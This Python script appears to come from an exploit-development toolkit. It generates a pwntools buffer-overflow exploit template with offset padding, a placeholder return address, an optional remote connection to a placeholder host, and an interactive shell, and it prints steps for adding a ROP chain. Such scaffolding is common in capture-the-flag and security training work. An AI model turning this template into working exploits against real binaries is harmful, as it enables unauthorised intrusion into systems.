#!/usr/bin/env python3
"""
Buffer Overflow Exploit Template Generator
Generates a basic buffer overflow exploit template using pwntools
"""

import sys
import os

def generate_bof_exploit(binary_path, offset, output_file):
    """Generate buffer overflow exploit template"""
    
    template = f'''#!/usr/bin/env python3
"""
Buffer Overflow Exploit for {os.path.basename(binary_path)}
Generated by pf exploit development tools
"""

from pwn import *

# Set context for the target binary
context.update(
    arch='amd64',
    os='linux',
    log_level='info'
)

# Binary information
binary = ELF('./{os.path.basename(binary_path)}')
libc = binary.libc

# Exploit parameters
OFFSET = {offset}

def exploit():
    """Main exploit function"""
    
    # Start the process (local or remote)
    if args.REMOTE:
        io = remote('target_host', 1234)
    else:
        io = process('./{os.path.basename(binary_path)}')
    
    # Build the payload
    payload = flat({{
        0: b'A' * OFFSET,          # Padding to reach return address
        OFFSET: p64(0xdeadbeef),   # Return address (replace with actual gadget)
    }})
    
    # Send the payload
    io.sendline(payload)
    
    # Get shell interaction
    io.interactive()

if __name__ == '__main__':
    exploit()
'''
    
    # Write the exploit to file
    with open(output_file, 'w') as f:
        f.write(template)
    
    # Make it executable
    os.chmod(output_file, 0o755)
    
    print(f"âœ“ Generated buffer overflow exploit template: {output_file}")
    print(f"  Binary: {binary_path}")
    print(f"  Offset: {offset}")
    print(f"\nNext steps:")
    print(f"  1. Find gadgets: pf rop-find-gadgets binary={binary_path}")
    print(f"  2. Edit {output_file} to add actual ROP chain")
    print(f"  3. Run: python3 {output_file}")

def main():
    if len(sys.argv) < 3:
        print("Usage: buffer_overflow_template.py <binary> <offset> [output_file]")
        print("Example: buffer_overflow_template.py vuln_binary 120 exploit.py")
        sys.exit(1)
    
    binary_path = sys.argv[1]
    offset = sys.argv[2]
    output_file = sys.argv[3] if len(sys.argv) > 3 else "bof_exploit.py"
    
    if not os.path.exists(binary_path):
        print(f"Error: Binary not found: {binary_path}")
        sys.exit(1)
    
    generate_bof_exploit(binary_path, offset, output_file)

if __name__ == '__main__':
    main()
